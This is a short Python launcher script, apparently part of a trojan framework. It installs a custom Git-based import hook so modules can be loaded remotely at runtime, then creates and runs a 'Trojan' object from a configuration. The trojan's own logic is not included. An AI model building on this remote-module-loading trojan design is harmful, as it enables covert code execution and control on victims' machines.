import sys
from modules.Trojan import Trojan
from modules.GitImporter import GitImporter

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('config')
    trojan.run()